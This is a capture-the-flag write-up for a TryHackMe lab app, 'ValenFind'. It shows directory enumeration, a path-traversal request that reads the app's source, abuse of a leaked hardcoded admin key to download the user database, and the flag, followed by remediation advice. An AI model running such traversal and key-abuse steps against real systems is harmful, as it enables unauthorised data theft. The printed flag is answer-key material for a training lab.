# ValenFind - TryHackMe CTF Writeup

## Challenge Overview
ValenFind is a vulnerable dating application that was "vibe-coded" by someone who just learned to code this year. Our mission: exploit it and capture the flag.

**Target:** `http://10.80.172.107:5000`

---

## Reconnaissance

### Gobuster Enumeration

```bash
gobuster dir -u http://10.80.172.107:5000 -w /usr/share/wordlists/dirb/common.txt
```

**Results:**
```
/dashboard            (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 2682]
/logout               (Status: 302) [Size: 189] [--> /]
/my_profile           (Status: 302) [Size: 199] [--> /login]
/register             (Status: 200) [Size: 2694]
```

Standard Flask application endpoints. We registered an account to access the application.

---

## Vulnerability Discovery

### LFI in Theme Selector

While viewing user profiles (e.g., `/profile/casanova_official`), we noticed a theme selector dropdown:

```html
<select id="theme-selector" onchange="loadTheme(this.value)">
    <option value="theme_classic.html">Classic Romance</option>
    <option value="theme_modern.html">Modern Dark</option>
    <option value="theme_romance.html">Cupid's Choice</option>
</select>
```

The JavaScript revealed the vulnerability:

```javascript
function loadTheme(layoutName) {
    // Feature: Dynamic Layout Fetching
    // Vulnerability: 'layout' parameter allows LFI
    fetch(`/api/fetch_layout?layout=${layoutName}`)
        .then(r => r.text())
        .then(html => {
            // Client-side rendering
        });
}
```

The `layout` parameter has **no input validation** - this is a textbook Local File Inclusion (LFI) vulnerability!

---

## Exploitation

### Step 1: Extract Source Code via LFI

```bash
curl "http://10.80.172.107:5000/api/fetch_layout?layout=../../app.py"
```

**Success!** The entire Flask application source code was returned. Key findings:

**1. Admin API Key (Hardcoded):**
```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

**2. Database Export Endpoint:**
```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
    else:
        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403
```

**3. Weak "Security" Filters (Not Applied to Admin API):**
```python
if 'cupid.db' in layout_file or layout_file.endswith('.db'):
    return "Security Alert: Database file access is strictly prohibited."
```

The developer blocked `.db` files in the LFI endpoint but left a wide-open admin API!

### Step 2: Download the Database

Using the discovered admin key:

```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     "http://10.80.172.107:5000/api/admin/export_db" \
     -o valenfind_leak.db
```

**Database downloaded successfully!**

### Step 3: Extract the Flag

```bash
sqlite3 valenfind_leak.db ".dump"
```

**Output (truncated):**
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    real_name TEXT,
    email TEXT,
    phone_number TEXT,
    address TEXT,
    bio TEXT,
    likes INTEGER DEFAULT 0,
    avatar_image TEXT
);

INSERT INTO users VALUES(1,'romeo_montague','juliet123','Romeo Montague',...);
INSERT INTO users VALUES(2,'casanova_official','secret123','Giacomo Casanova',...);
...
INSERT INTO users VALUES(8,'cupid','admin_root_x99','System Administrator',
'cupid@internal.cupid','555-0000-ROOT',
'FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}',
'I keep the database secure. No peeking.',1000,'cupid.jpg');
```

**🚩 Flag Found:** `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`

---

## Attack Chain Summary

```
1. Browse application → Find profile theme selector
2. Inspect JavaScript → Discover /api/fetch_layout?layout= endpoint
3. LFI exploitation → curl layout=../../app.py
4. Source code analysis → Find ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
5. API abuse → curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" /api/admin/export_db
6. Database dump → sqlite3 .dump
7. Flag extraction → Found in 'cupid' user's address field
```

---

## Vulnerabilities Found

### 1. **Local File Inclusion (LFI)** - CRITICAL
- **Location:** `/api/fetch_layout?layout=`
- **Impact:** Read arbitrary server files
- **Root Cause:** No input validation on `layout` parameter
- **Fix:** Whitelist allowed filenames or use safe path joining

### 2. **Hardcoded Secrets** - CRITICAL
- **Location:** `app.py` line 10
- **Impact:** Complete authentication bypass
- **Root Cause:** API key committed to source code
- **Fix:** Use environment variables for secrets

### 3. **Unrestricted Admin Endpoint** - HIGH
- **Location:** `/api/admin/export_db`
- **Impact:** Full database export to any authenticated request
- **Root Cause:** Weak authentication (static header token)
- **Fix:** Implement proper authentication (e.g., JWT with role-based access)

### 4. **Plaintext Password Storage** - CRITICAL
- **Evidence:** `if user and user['password'] == password:`
- **Impact:** All user passwords compromised in breach
- **Fix:** Use bcrypt/argon2 password hashing

---

## Lessons Learned

1. **Input Validation is Non-Negotiable** - Every user input must be validated, especially file paths
2. **Secrets Don't Belong in Code** - Use `.env` files and environment variables
3. **Defense in Depth** - The LFI filter blocked `.db` files but forgot about the admin API
4. **Hash Your Passwords** - Plaintext passwords are unacceptable in any modern application
5. **Code Reviews Matter** - A peer review would have caught these issues immediately

---

## Tools Used

- **Gobuster** - Directory/file enumeration
- **curl** - HTTP requests and exploitation
- **sqlite3** - Database inspection
- **Browser DevTools** - JavaScript source analysis

---

**Challenge Completed:** ✅  
**Flag:** `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`  
**Difficulty:** Medium  
**Primary Vulnerabilities:** LFI, Hardcoded Credentials, Information Disclosure
